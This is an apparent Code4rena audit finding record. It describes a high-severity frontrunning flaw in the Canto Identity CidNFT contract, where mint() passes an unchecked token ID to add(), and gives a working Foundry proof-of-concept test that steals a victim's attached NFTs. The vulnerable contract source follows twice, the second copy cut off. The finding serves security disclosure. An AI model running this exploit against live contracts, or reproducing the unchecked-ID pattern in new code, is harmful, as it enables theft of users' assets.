{
  "Title": "[H-01] Attacker can frontrun a victim's `mint`+`add` transaction to steal NFT",
  "Content": "\n[CidNFT.sol#L147](https://github.com/code-423n4/2023-01-canto-identity/blob/main/src/CidNFT.sol#L147)<br>\n[CidNFT.sol#L165](https://github.com/code-423n4/2023-01-canto-identity/blob/main/src/CidNFT.sol#L165)<br>\n[CidNFT.sol#L237](https://github.com/code-423n4/2023-01-canto-identity/blob/main/src/CidNFT.sol#L237)\n\nHigh - an attacker can steal deposited NFTs from victims using the `mint()` + `add()` functionality in `CidNFT.sol`\n\n### Proof of Concept\n\nOne of the core features of CID Protocol is the ability for users to attach Subprotocol NFTs to their `CidNFT`. The `CidNFT` contract custodies these attached NFTs, and they are regarded as \"traits\" of the user.\n\nThe protocol currently includes functionality for a user to mint a `CidNFT` as their identity and then optionally add a subprotocol NFT to that `CidNFT` in the same transaction. This occurs in the `mint()` function of `CidNFT.sol`, which takes a byte array of `add()` parameters and includes a loop where `add()` can be repeatedly called with these parameters to attach subprotocol NFTs to the `CidNFT`.\n\n```\n\nfunction mint(bytes[] calldata _addList) external {\n    _mint(msg.sender, ++numMinted); \n    bytes4 addSelector = this.add.selector;\n    for (uint256 i = 0; i < _addList.length; ++i) {\n        (bool success /*bytes memory result*/, ) = address(this)\n            .delegatecall(abi.encodePacked(addSelector, _addList[i]));\n        if (!success) revert AddCallAfterMintingFailed(i);\n    }\n}\n```\n\nOne of the arguments for `add()` is the `_cidNFTID` to which the user would like to attach their outside NFT. However, `_cidNFTID` is specified in calldata to `mint()`, and there is no guarantee that the user is actually `add()`ing to the `CidNFT` that they just minted. There is only a check in `add()` that the user is either the owner or approved for that `CidNFT`.\n\n    function add(\n            uint256 _cidNFTID, // No guarantee that this is the CidNFT id that was just minted by the user\n            string calldata _subprotocolName,\n            uint256 _key,\n            uint256 _nftIDToAdd,\n            AssociationType _type\n        ) external {\n        ...............\n        if (\n            cidNFTOwner != msg.sender &&\n            getApproved[_cidNFTID] != msg.sender &&\n            !isApprovedForAll[cidNFTOwner][msg.sender]\n        ) revert NotAuthorizedForCIDNFT(msg.sender, _cidNFTID, cidNFTOwner);\n        ...............\n    }\n\nThis opens up the following attack:\n\n1.  Victim sends a transaction expecting to mint `CidNFT #100`, and includes calldata to `add()` their SubprotocolNFT to the token in the same tx\n2.  Attacker frontruns this transaction with a `mint()` with no `add()` parameters, receives `CidNFT #100`, and sets the victim as approved for that token\n3.  The victim's transaction begins execution, and they instead receive token #101, though their `add()` calldata still specifies token #100\n4.  The victim's `add()` call continues, and their SubprotocolNFT is registered to `CidNFT #100` and transferred to the `CidNFT` contract\n5.  The attacker can then either revoke approval to the victim for `CidNFT #100` or immediately call `remove()` to transfer the victim's SubprotocolNFT to themselves\n\nBelow is a forge test executing this attack. This should run if dropped into `CidNFT.t.sol`.\n\n    function testMaliciousMint() public {\n        uint256 cidTokenId = cidNFT.numMinted() + 1;\n        (uint256 subTokenId1, uint256 subTokenId2) = (1, 2);\n        (uint256 key1, uint256 key2) = (1, 2);\n\n        // user1 == attacker\n        // user2 == victim\n        // Frontrun the victim's mint by minting the cidNFT token they expect before them\n        vm.startPrank(user1);\n        cidNFT.mint(new bytes[](0));\n\n        // Set the victim (user2) as approved for the token user1 just minted\n        cidNFT.setApprovalForAll(user2, true);\n        vm.stopPrank();\n\n        // Mint user2 the subtokens that user1 wants to steal, approve the CidNFT contract\n        // for the subtokens, and prepare the addlist with the incorrect cidNFT token id\n        vm.startPrank(user2);\n        sub1.mint(user2, subTokenId1);\n        sub1.mint(user2, subTokenId2);\n        sub1.setApprovalForAll(address(cidNFT), true);\n\n        bytes[] memory addList = new bytes[](2);\n        addList[0] = abi.encode(\n            cidTokenId,\n            \"sub1\",\n            key1,\n            subTokenId1,\n            CidNFT.AssociationType.ORDERED\n        );\n        addList[1] = abi.encode(\n            cidTokenId,\n            \"sub1\",\n            key2,\n            subTokenId2,\n            CidNFT.AssociationType.ORDERED\n        );\n\n        // Mint user2 a new CidNFT and attach the subtokens to user1's CidNFT\n        cidNFT.mint(addList);\n        vm.stopPrank();\n\n        // Confirm that user1's CidNFT has the subtokens and can transfer them out\n        vm.startPrank(user1);\n        cidNFT.remove(\n            cidTokenId,\n            \"sub1\",\n            key1,\n            subTokenId1,\n            CidNFT.AssociationType.ORDERED\n        );\n        cidNFT.remove(\n            cidTokenId,\n            \"sub1\",\n            key2,\n            subTokenId2,\n            CidNFT.AssociationType.ORDERED\n        );\n        vm.stopPrank();\n\n        // Confirm that user1 now holds the subtokens\n        assertEq(cidNFT.ownerOf(cidTokenId), user1);\n        assertEq(cidNFT.ownerOf(cidTokenId + 1), user2);\n        assertEq(sub1.ownerOf(subTokenId1), user1);\n        assertEq(sub1.ownerOf(subTokenId2), user1);\n    }\n    ## Tools Used\n    Manual review\n\n    ## Recommended Mitigation Steps\n    - Enforce that the user can only `add()` to the CidNFT that they just minted rather than allowing for arbitrary IDs\n\n**[OpenCoreCH (Canto Identity) confirmed and commented](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/67#issuecomment-1426123803):**\n > Great finding, will be fixed.\n\n\n\n***\n\n \n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2023-01-canto-identity-protocol-contest",
  "Code": [
    {
      "filename": "src/CidNFT.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-only\npragma solidity >=0.8.0;\n\nimport {ERC721, ERC721TokenReceiver} from \"solmate/tokens/ERC721.sol\";\nimport \"solmate/tokens/ERC20.sol\";\nimport \"solmate/utils/SafeTransferLib.sol\";\nimport \"./SubprotocolRegistry.sol\";\n\n/// @title Canto Identity Protocol NFT\n/// @notice CID NFTs are at the heart of the CID protocol. All key/values of subprotocols are associated with them.\ncontract CidNFT is ERC721, ERC721TokenReceiver {\n    /*//////////////////////////////////////////////////////////////\n                                 CONSTANTS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Fee (in BPS) that is charged for every mint (as a percentage of the mint fee). Fixed at 10%.\n    uint256 public constant CID_FEE_BPS = 1_000;\n\n    /*//////////////////////////////////////////////////////////////\n                                 ADDRESSES\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Wallet that receives CID fees\n    address public immutable cidFeeWallet;\n\n    /// @notice Reference to the NOTE TOKEN\n    ERC20 public immutable note;\n\n    /// @notice Reference to the subprotocol registry\n    SubprotocolRegistry public immutable subprotocolRegistry;\n\n    /*//////////////////////////////////////////////////////////////\n                                 STATE\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Base URI of the NFT\n    string public baseURI;\n\n    /// @notice Array of uint256 values (NFT IDs) with additional position information NFT ID => (array pos. + 1)\n    struct IndexedArray {\n        uint256[] values;\n        mapping(uint256 => uint256) positions;\n    }\n\n    /// @notice Data that is associated with a CID NFT -> subprotocol combination\n    struct SubprotocolData {\n        /// @notice Mapping for ordered type\n        mapping(uint256 => uint256) ordered;\n        /// @notice Value for primary type\n        uint256 primary;\n        /// @notice List for active type\n        IndexedArray active;\n    }\n\n    /// @notice The different types of associations between CID NFTs and subprotocol NFTs\n    enum AssociationType {\n        /// @notice key => NFT mapping\n        ORDERED,\n        /// @notice Zero or one NFT\n        PRIMARY,\n        /// @notice List of NFTs\n        ACTIVE\n    }\n\n    /// @notice Counter of the minted NFTs\n    /// @dev Used to assign a new unique ID. The first ID that is assigned is 1, ID 0 is never minted.\n    uint256 public numMinted;\n\n    /// @notice Stores the references to subprotocol NFTs. Mapping nftID => subprotocol name => subprotocol data\n    mapping(uint256 => mapping(string => SubprotocolData)) internal cidData;\n\n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n    event OrderedDataAdded(\n        uint256 indexed cidNFTID,\n        string indexed subprotocolName,\n        uint256 indexed key,\n        uint256 subprotocolNFTID\n    );\n    event PrimaryDataAdded(uint256 indexed cidNFTID, string indexed subprotocolName, uint256 subprotocolNFTID);\n    event ActiveDataAdded(\n        uint256 indexed cidNFTID,\n        string indexed subprotocolName,\n        uint256 subprotocolNFTID,\n        uint256 arrayIndex\n    );\n    event OrderedDataRemoved(\n        uint256 indexed cidNFTID,\n        string indexed subprotocolName,\n        uint256 indexed key,\n        uint256 subprotocolNFTID\n    );\n    event PrimaryDataRemoved(uint256 indexed cidNFTID, string indexed subprotocolName, uint256 subprotocolNFTID);\n    event ActiveDataRemoved(uint256 indexed cidNFTID, string indexed subprotocolName, uint256 subprotocolNFTID);\n\n    /*//////////////////////////////////////////////////////////////\n                                 ERRORS\n    //////////////////////////////////////////////////////////////*/\n    error TokenNotMinted(uint256 tokenID);\n    error AddCallAfterMintingFailed(uint256 index);\n    error SubprotocolDoesNotExist(string subprotocolName);\n    error NFTIDZeroDisallowedForSubprotocols();\n    error AssociationTypeNotSupportedForSubprotocol(AssociationType associationType, string subprotocolName);\n    error NotAuthorizedForCIDNFT(address caller, uint256 cidNFTID, address cidNFTOwner);\n    error NotAuthorizedForSubprotocolNFT(address caller, uint256 subprotocolNFTID);\n    error ActiveArrayAlreadyContainsID(uint256 cidNFTID, string subprotocolName, uint256 nftIDToAdd);\n    error OrderedValueNotSet(uint256 cidNFTID, string subprotocolName, uint256 key);\n    error PrimaryValueNotSet(uint256 cidNFTID, string subprotocolName);\n    error ActiveArrayDoesNotContainID(uint256 cidNFTID, string subprotocolName, uint256 nftIDToRemove);\n\n    /// @notice Sets the name, symbol, baseURI, and the address of the auction factory\n    /// @param _name Name of the NFT\n    /// @param _symbol Symbol of the NFT\n    /// @param _baseURI NFT base URI. {id}.json is appended to this URI\n    /// @param _cidFeeWallet Address of the wallet that receives the fees\n    /// @param _noteContract Address of the $NOTE contract\n    /// @param _subprotocolRegistry Address of the subprotocol registry\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        string memory _baseURI,\n        address _cidFeeWallet,\n        address _noteContract,\n        address _subprotocolRegistry\n    ) ERC721(_name, _symbol) {\n        baseURI = _baseURI;\n        cidFeeWallet = _cidFeeWallet;\n        note = ERC20(_noteContract);\n        subprotocolRegistry = SubprotocolRegistry(_subprotocolRegistry);\n    }\n\n    /// @notice Get the token URI for the provided ID\n    /// @param _id ID to retrieve the URI for\n    /// @return tokenURI The URI of the queried token (path to a JSON file)\n    function tokenURI(uint256 _id) public view override returns (string memory) {\n        if (ownerOf[_id] == address(0))\n            // According to ERC721, this revert for non-existing tokens is required\n            revert TokenNotMinted(_id);\n        return string(abi.encodePacked(baseURI, _id, \".json\"));\n    }\n\n    /// @notice Mint a new CID NFT\n    /// @dev An address can mint multiple CID NFTs, but it can only set one as associated with it in the AddressRegistry\n    /// @param _addList An optional list of encoded parameters for add to add subprotocol NFTs directly after minting.\n    /// The parameters should not include the function selector itself, the function select for add is always prepended.\n    function mint(bytes[] calldata _addList) external {\n        _mint(msg.sender, ++numMinted); // We do not use _safeMint here on purpose. If a contract calls this method, he expects to get an NFT back\n        bytes4 addSelector = this.add.selector;\n        for (uint256 i = 0; i < _addList.length; ++i) {\n            (\n                bool success, /*bytes memory result*/\n\n            ) = address(this).delegatecall(abi.encodePacked(addSelector, _addList[i]));\n            if (!success) revert AddCallAfterMintingFailed(i);\n        }\n    }\n\n    /// @notice Add a new entry for the given subprotocol to the provided CID NFT\n    /// @param _cidNFTID ID of the CID NFT to add the data to\n    /// @param _subprotocolName Name of the subprotocol where the data will be added. Has to exist.\n    /// @param _key Key to set. This value is only relevant for the AssociationType ORDERED (where a mapping int => nft ID is stored)\n    /// @param _nftIDToAdd The ID of the NFT to add\n    /// @param _type Association type (see AssociationType struct) to use for this data\n    function add(\n        uint256 _cidNFTID,\n        string calldata _subprotocolName,\n        uint256 _key,\n        uint256 _nftIDToAdd,\n        AssociationType _type\n    ) external {\n        SubprotocolRegistry.SubprotocolData memory subprotocolData = subprotocolRegistry.getSubprotocol(\n            _subprotocolName\n        );\n        address subprotocolOwner = subprotocolData.owner;\n        if (subprotocolOwner == address(0)) revert SubprotocolDoesNotExist(_subprotocolName);\n        address cidNFTOwner = ownerOf[_cidNFTID];\n        if (\n            cidNFTOwner != msg.sender &&\n            getApproved[_cidNFTID] != msg.sender &&\n            !isApprovedForAll[cidNFTOwner][msg.sender]\n        ) revert NotAuthorizedForCIDNFT(msg.sender, _cidNFTID, cidNFTOwner);\n        if (_nftIDToAdd == 0) revert NFTIDZeroDisallowedForSubprotocols(); // ID 0 is disallowed in subprotocols\n\n        // The CID Protocol safeguards the NFTs of subprotocols. Note that these NFTs are usually pointers to other data / NFTs (e.g., to an image NFT for profile pictures)\n        ERC721 nftToAdd = ERC721(subprotocolData.nftAddress);\n        nftToAdd.safeTransferFrom(msg.sender, address(this), _nftIDToAdd);\n        // Charge fee (subprotocol & CID fee) if configured\n        uint96 subprotocolFee = subprotocolData.fee;\n        if (subprotocolFee != 0) {\n            uint256 cidFee = (subprotocolFee * CID_FEE_BPS) / 10_000;\n            SafeTransferLib.safeTransferFrom(note, msg.sender, cidFeeWallet, cidFee);\n            SafeTransferLib.safeTransferFrom(note, msg.sender, subprotocolOwner, subprotocolFee - cidFee);\n        }\n        if (_type == AssociationType.ORDERED) {\n            if (!subprotocolData.ordered) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);\n            if (cidData[_cidNFTID][_subprotocolName].ordered[_key] != 0) {\n                // Remove to ensure that user gets NFT back\n                remove(_cidNFTID, _subprotocolName, _key, 0, _type);\n            }\n            cidData[_cidNFTID][_subprotocolName].ordered[_key] = _nftIDToAdd;\n            emit OrderedDataAdded(_cidNFTID, _subprotocolName, _key, _nftIDToAdd);\n        } else if (_type == AssociationType.PRIMARY) {\n            if (!subprotocolData.primary) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);\n            if (cidData[_cidNFTID][_subprotocolName].primary != 0) {\n                // Remove to ensure that user gets NFT back\n                remove(_cidNFTID, _subprotocolName, 0, 0, _type);\n            }\n            cidData[_cidNFTID][_subprotocolName].primary = _nftIDToAdd;\n            emit PrimaryDataAdded(_cidNFTID, _subprotocolName, _nftIDToAdd);\n        } else if (_type == AssociationType.ACTIVE) {\n            if (!subprotocolData.active) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);\n            IndexedArray storage activeData = cidData[_cidNFTID][_subprotocolName].active;\n            uint256 lengthBeforeAddition = activeData.values.length;\n            if (lengthBeforeAddition == 0) {\n                uint256[] memory nftIDsToAdd = new uint256[](1);\n                nftIDsToAdd[0] = _nftIDToAdd;\n                activeData.values = nftIDsToAdd;\n                activeData.positions[_nftIDToAdd] = 1; // Array index + 1\n            } else {\n                // Check for duplicates\n                if (activeData.positions[_nftIDToAdd] != 0)\n                    revert ActiveArrayAlreadyContainsID(_cidNFTID, _subprotocolName, _nftIDToAdd);\n                activeData.values.push(_nftIDToAdd);\n                activeData.positions[_nftIDToAdd] = lengthBeforeAddition + 1;\n            }\n            emit ActiveDataAdded(_cidNFTID, _subprotocolName, _nftIDToAdd, lengthBeforeAddition);\n        }\n    }\n\n    /// @notice Remove / unset a key for the given CID NFT and subprotocol\n    /// @param _cidNFTID ID of the CID NFT to remove the data from\n    /// @param _subprotocolName Name of the subprotocol where the data will be removed. Has to exist.\n    /// @param _key Key to unset. This value is only relevant for the AssociationType ORDERED\n    /// @param _nftIDToRemove The ID of the NFT to remove. Only needed for the AssociationType ACTIVE\n    /// @param _type Association type (see AssociationType struct) to remove this data from\n    function remove(\n        uint256 _cidNFTID,\n        string calldata _subprotocolName,\n        uint256 _key,\n        uint256 _nftIDToRemove,\n        AssociationType _type\n    ) public {\n        SubprotocolRegistry.SubprotocolData memory subprotocolData = subprotocolRegistry.getSubprotocol(\n            _subprotocolName\n        );\n        address subprotocolOwner = subprotocolData.owner;\n        if (subprotocolOwner == address(0)) revert SubprotocolDoesNotExist(_subprotocolName);\n        address cidNFTOwner = ownerOf[_cidNFTID];\n        if (\n            cidNFTOwner != msg.sender &&\n            getApproved[_cidNFTID] != msg.sender &&\n            !isApprovedForAll[cidNFTOwner][msg.sender]\n        ) revert NotAuthorizedForCIDNFT(msg.sender, _cidNFTID, cidNFTOwner);\n\n        ERC721 nftToRemove = ERC721(subprotocolData.nftAddress);\n        if (_type == AssociationType.ORDERED) {\n            // We do not have to check if ordered is supported by the subprotocol. If not, the value will not be unset (which is checked below)\n            uint256 currNFTID = cidData[_cidNFTID][_subprotocolName].ordered[_key];\n            if (currNFTID == 0)\n                // This check is technically not necessary (because the NFT transfer would fail), but we include it to have more meaningful errors\n                revert OrderedValueNotSet(_cidNFTID, _subprotocolName, _key);\n            delete cidData[_cidNFTID][_subprotocolName].ordered[_key];\n            nftToRemove.safeTransferFrom(address(this), msg.sender, currNFTID);\n            emit OrderedDataRemoved(_cidNFTID, _subprotocolName, _key, _nftIDToRemove);\n        } else if (_type == AssociationType.PRIMARY) {\n            uint256 currNFTID = cidData[_cidNFTID][_subprotocolName].primary;\n            if (currNFTID == 0) revert PrimaryValueNotSet(_cidNFTID, _subprotocolName);\n            delete cidData[_cidNFTID][_subprotocolName].primary;\n            nftToRemove.safeTransferFrom(address(this), msg.sender, currNFTID);\n            emit PrimaryDataRemoved(_cidNFTID, _subprotocolName, _nftIDToRemove);\n        } else if (_type == AssociationType.ACTIVE) {\n            IndexedArray storage activeData = cidData[_cidNFTID][_subprotocolName].active;\n            uint256 arrayPosition = activeData.positions[_nftIDToRemove]; // Index + 1, 0 if non-existant\n            if (arrayPosition == 0) revert ActiveArrayDoesNotContainID(_cidNFTID, _subprotocolName, _nftIDToRemove);\n            uint256 arrayLength = activeData.values.length;\n            // Swap only necessary if not already the last element\n            if (arrayPosition != arrayLength) {\n                uint256 befSwapLastNFTID = activeData.values[arrayLength - 1];\n                activeData.values[arrayPosition - 1] = befSwapLastNFTID;\n                activeData.positions[befSwapLastNFTID] = arrayPosition;\n            }\n            activeData.values.pop();\n            activeData.positions[_nftIDToRemove] = 0;\n            nftToRemove.safeTransferFrom(address(this), msg.sender, _nftIDToRemove);\n            emit ActiveDataRemoved(_cidNFTID, _subprotocolName, _nftIDToRemove);\n        }\n    }\n\n    /// @notice Get the ordered data that is associated with a CID NFT / Subprotocol\n    /// @param _cidNFTID ID of the CID NFT to query\n    /// @param _subprotocolName Name of the subprotocol to query\n    /// @param _key Key to query\n    /// @return subprotocolNFTID The ID of the NFT at the queried key. 0 if it does not exist\n    function getOrderedData(\n        uint256 _cidNFTID,\n        string calldata _subprotocolName,\n        uint256 _key\n    ) external view returns (uint256 subprotocolNFTID) {\n        subprotocolNFTID = cidData[_cidNFTID][_subprotocolName].ordered[_key];\n    }\n\n    /// @notice Get the primary data that is associated with a CID NFT / Subprotocol\n    /// @param _cidNFTID ID of the CID NFT to query\n    /// @param _subprotocolName Name of the subprotocol to query\n    /// @return subprotocolNFTID The ID of the primary NFT at the queried subprotocl / CID NFT. 0 if it does not exist\n    function getPrimaryData(uint256 _cidNFTID, string calldata _subprotocolName)\n        external\n        view\n        returns (uint256 subprotocolNFTID)\n    {\n        subprotocolNFTID = cidData[_cidNFTID][_subprotocolName].primary;\n    }\n\n    /// @notice Get the active data list that is associated with a CID NFT / Subprotocol\n    /// @param _cidNFTID ID of the CID NFT to query\n    /// @param _subprotocolName Name of the subprotocol to query\n    /// @return subprotocolNFTIDs The ID of the primary NFT at the queried subprotocl / CID NFT. 0 if it does not exist\n    function getActiveData(uint256 _cidNFTID, string calldata _subprotocolName)\n        external\n        view\n        returns (uint256[] memory subprotocolNFTIDs)\n    {\n        subprotocolNFTIDs = cidData[_cidNFTID][_subprotocolName].active.values;\n    }\n\n    /// @notice Check if a provided NFT ID is included in the active data list that is associated with a CID NFT / Subprotocol\n    /// @param _cidNFTID ID of the CID NFT to query\n    /// @param _subprotocolName Name of the subprotocol to query\n    /// @return nftIncluded True if the NFT ID is in the list\n    function activeDataIncludesNFT(\n        uint256 _cidNFTID,\n        string calldata _subprotocolName,\n        uint256 _nftIDToCheck\n    ) external view returns (bool nftIncluded) {\n        nftIncluded = cidData[_cidNFTID][_subprotocolName].active.positions[_nftIDToCheck] != 0;\n    }\n\n    function onERC721Received(\n        address, /*operator*/\n        address, /*from*/\n        uint256, /*id*/\n        bytes calldata /*data*/\n    ) external pure returns (bytes4) {\n        return ERC721TokenReceiver.onERC721Received.selector;\n    }\n}"
    },
    {
      "filename": "src/CidNFT.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-only\npragma solidity >=0.8.0;\n\nimport {ERC721, ERC721TokenReceiver} from \"solmate/tokens/ERC721.sol\";\nimport \"solmate/tokens/ERC20.sol\";\nimport \"solmate/utils/SafeTransferLib.sol\";\nimport \"./SubprotocolRegistry.sol\";\n\n/// @title Canto Identity Protocol NFT\n/// @notice CID NFTs are at the heart of the CID protocol. All key/values of subprotocols are associated with them.\ncontract CidNFT is ERC721, ERC721TokenReceiver {\n    /*//////////////////////////////////////////////////////////////\n                                 CONSTANTS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Fee (in BPS) that is charged for every mint (as a percentage of the mint fee). Fixed at 10%.\n    uint256 public constant CID_FEE_BPS = 1_000;\n\n    /*//////////////////////////////////////////////////////////////\n                                 ADDRESSES\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Wallet that receives CID fees\n    address public immutable cidFeeWallet;\n\n    /// @notice Reference to the NOTE TOKEN\n    ERC20 public immutable note;\n\n    /// @notice Reference to the subprotocol registry\n    SubprotocolRegistry public immutable subprotocolRegistry;\n\n    /*//////////////////////////////////////////////////////////////\n                                 STATE\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Base URI of the NFT\n    string public baseURI;\n\n    /// @notice Array of uint256 values (NFT IDs) with additional position information NFT ID => (array pos. + 1)\n    struct IndexedArray {\n        uint256[] values;\n        mapping(uint256 => uint256) positions;\n    }\n\n    /// @notice Data that is associated with a CID NFT -> subprotocol combination\n    struct SubprotocolData {\n        /// @notice Mapping for ordered type\n        mapping(uint256 => uint256) ordered;\n        /// @notice Value for primary type\n        uint256 primary;\n        /// @notice List for active type\n        IndexedArray active;\n    }\n\n    /// @notice The different types of associations between CID NFTs and subprotocol NFTs\n    enum AssociationType {\n        /// @notice key => NFT mapping\n        ORDERED,\n        /// @notice Zero or one NFT\n        PRIMARY,\n        /// @notice List of NFTs\n        ACTIVE\n    }\n\n    /// @notice Counter of the minted NFTs\n    /// @dev Used to assign a new unique ID. The first ID that is assigned is 1, ID 0 is never minted.\n    uint256 public numMinted;\n\n    /// @notice Stores the references to subprotocol NFTs. Mapping nftID => subprotocol name => subprotocol data\n    mapping(uint256 => mapping(string => SubprotocolData)) internal cidData;\n\n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n    event OrderedDataAdded(\n        uint256 indexed cidNFTID,\n        string indexed subprotocolName,\n        uint256 indexed key,\n        uint256 subprotocolNFTID\n    );\n    event PrimaryDataAdded(uint256 indexed cidNFTID, string indexed subprotocolName, uint256 subprotocolNFTID);\n    event ActiveDataAdded(\n        uint256 indexed cidNFTID,\n        string indexed subprotocolName,\n        uint256 subprotocolNFTID,\n        uint256 arrayIndex\n    );\n    event OrderedDataRemoved(\n        uint256 indexed cidNFTID,\n        string indexed subprotocolName,\n        uint256 indexed key,\n        uint256 subprotocolNFTID\n    );\n    event PrimaryDataRemoved(uint256 indexed cidNFTID, string indexed subprotocolName, uint256 subprotocolNFTID);\n    event ActiveDataRemoved(uint256 indexed cidNFTID, string indexed subprotocolName, uint256 subprotocolNFTID);\n\n    /*//////////////////////////////////////////////////////////////\n                                 ERRORS\n    //////////////////////////////////////////////////////////////*/\n    error TokenNotMinted(uint256 tokenID);\n    error AddCallAfterMintingFailed(uint256 index);\n    error SubprotocolDoesNotExist(string subprotocolName);\n    error NFTIDZeroDisallowedForSubprotocols();\n    error AssociationTypeNotSupportedForSubprotocol(AssociationType associationType, string subprotocolName);\n    error NotAuthorizedForCIDNFT(address caller, uint256 cidNFTID, address cidNFTOwner);\n    error NotAuthorizedForSubprotocolNFT(address caller, uint256 subprotocolNFTID);\n    error ActiveArrayAlreadyContainsID(uint256 cidNFTID, string subprotocolName, uint256 nftIDToAdd);\n    error OrderedValueNotSet(uint256 cidNFTID, string subprotocolName, uint256 key);\n    error PrimaryValueNotSet(uint256 cidNFTID, string subprotocolName);\n    error ActiveArrayDoesNotContainID(uint256 cidNFTID, string subprotocolName, uint256 nftIDToRemove);\n\n    /// @notice Sets the name, symbol, baseURI, and the address of the auction factory\n    /// @param _name Name of the NFT\n    /// @param _symbol Symbol of the NFT\n    /// @param _baseURI NFT base URI. {id}.json is appended to this URI\n    /// @param _cidFeeWallet Address of the wallet that receives the fees\n    /// @param _noteContract Address of the $NOTE contract\n    /// @param _subprotocolRegistry Address of the subprotocol registry\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        string memory _baseURI,\n        address _cidFeeWallet,\n        address _noteContract,\n        address _subprotocolRegistry\n    ) ERC721(_name, _symbol) {\n        baseURI = _baseURI;\n        cidFeeWallet = _cidFeeWallet;\n        note = ERC20(_noteContract);\n        subprotocolRegistry = SubprotocolRegistry(_subprotocolRegistry);\n    }\n\n    /// @notice Get the token URI for the provided ID\n    /// @param _id ID to retrieve the URI for\n    /// @return tokenURI The URI of the queried token (path to a JSON file)\n    function tokenURI(uint256 _id) public view override returns (string memory) {\n        if (ownerOf[_id] == address(0))\n            // According to ERC721, this revert for non-existing tokens is required\n            revert TokenNotMinted(_id);\n        return string(abi.encodePacked(baseURI, _id, \".json\"));\n    }\n\n    /// @notice Mint a new CID NFT\n    /// @dev An address can mint multiple CID NFTs, but it can only set one as associated with it in the AddressRegistry\n    /// @param _addList An optional list of encoded parameters for add to add subprotocol NFTs directly after minting.\n    /// The parameters should not include the function selector itself, the function select for add is always prepended.\n    function mint(bytes[] calldata _addList) external {\n        _mint(msg.sender, ++numMinted); // We do not use _safeMint here on purpose. If a contract calls this method, he expects to get an NFT back\n        bytes4 addSelector = this.add.selector;\n        for (uint256 i = 0; i < _addList.length; ++i) {\n            (\n                bool success, /*bytes memory result*/\n\n            ) = address(this).delegatecall(abi.encodePacked(addSelector, _addList[i]));\n            if (!success) revert AddCallAfterMintingFailed(i);\n        }\n    }\n\n    /// @notice Add a new entry for the given subprotocol to the provided CID NFT\n    /// @param _cidNFTID ID of the CID NFT to add the data to\n    /// @param _subprotocolName Name of the subprotocol where the data will be added. Has to exist.\n    /// @param _key Key to set. This value is only relevant for the AssociationType ORDERED (where a mapping int => nft ID is stored)\n    /// @param _nftIDToAdd The ID of the NFT to add\n    /// @param _type Association type (see AssociationType struct) to use for this data\n    function add(\n        uint256 _cidNFTID,\n        string calldata _subprotocolName,\n        uint256 _key,\n        uint256 _nftIDToAdd,\n        AssociationType _type\n    ) external {\n        SubprotocolRegistry.SubprotocolData memory subprotocolData = subprotocolRegistry.getSubprotocol(\n            _subprotocolName\n        );\n        address subprotocolOwner = subprotocolData.owner;\n        if (subprotocolOwner == address(0)) revert SubprotocolDoesNotExist(_subprotocolName);\n        address cidNFTOwner = ownerOf[_cidNFTID];\n        if (\n            cidNFTOwner != msg.sender &&\n            getApproved[_cidNFTID] != msg.sender &&\n            !isApprovedForAll[cidNFTOwner][msg.sender]\n        ) revert NotAuthorizedForCIDNFT(msg.sender, _cidNFTID, cidNFTOwner);\n        if (_nftIDToAdd == 0) revert NFTIDZeroDisallowedForSubprotocols(); // ID 0 is disallowed in subprotocols\n\n        // The CID Protocol safeguards the NFTs of subprotocols. Note that these NFTs are usually pointers to other data / NFTs (e.g., to an image NFT for profile pictures)\n        ERC721 nftToAdd = ERC721(subprotocolData.nftAddress);\n        nftToAdd.safeTransferFrom(msg.sender, address(this), _nftIDToAdd);\n        // Charge fee (subprotocol & CID fee) if configured\n        uint96 subprotocolFee = subprotocolData.fee;\n        if (subprotocolFee != 0) {\n            uint256 cidFee = (subprotocolFee * CID_FEE_BPS) / 10_000;\n            SafeTransferLib.safeTransferFrom(note, msg.sender, cidFeeWallet, cidFee);\n            SafeTransferLib.safeTransferFrom(note, msg.sender, subprotocolOwner, subprotocolFee - cidFee);\n        }\n        if (_type == AssociationType.ORDERED) {\n            if (!subprotocolData.ordered) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);\n            if (cidData[_cidNFTID][_subprotocolName].ordered[_key] != 0) {\n                // Remove to ensure that user gets NFT back\n                remove(_cidNFTID, _subprotocolName, _key, 0, _type);\n            }\n            cidData[_cidNFTID][_subprotocolName].ordered[_key] = _nftIDToAdd;\n            emit OrderedDataAdded(_cidNFTID, _subprotocolName, _key, _nftIDToAdd);\n        } else if (_type == AssociationType.PRIMARY) {\n            if (!subprotocolData.primary) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);\n            if (cidData[_cidNFTID][_subprotocolName].primary != 0) {\n                // Remove to ensure that user gets NFT back\n                remove(_cidNFTID, _subprotocolName, 0, 0, _type);\n            }\n            cidData[_cidNFTID][_subprotocolName].primary = _nftIDToAdd;\n            emit PrimaryDataAdded(_cidNFTID, _subprotocolName, _nftIDToAdd);\n        } else if (_type == AssociationType.ACTIVE) {\n            if (!subprotocolData.active) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);\n            IndexedArray storage activeData = cidData[_cidNFTID][_subprotocolName].active;\n            uint256 lengthBeforeAddition = activeData.values.length;\n            if (lengthBeforeAddition == 0) {\n                uint256[] memory nftIDsToAdd = new uint256[](1);\n                nftIDsToAdd[0] = _nftIDToAdd;\n                activeData.values = nftIDsToAdd;\n                activeData.positions[_nftIDToAdd] = 1; // Array index + 1\n            } else {\n                // Check for duplicates\n                if (activeData.positions[_nftIDToAdd] != 0)\n                    revert ActiveArrayAlreadyContainsID(_cidNFTID, _subprotocolName, 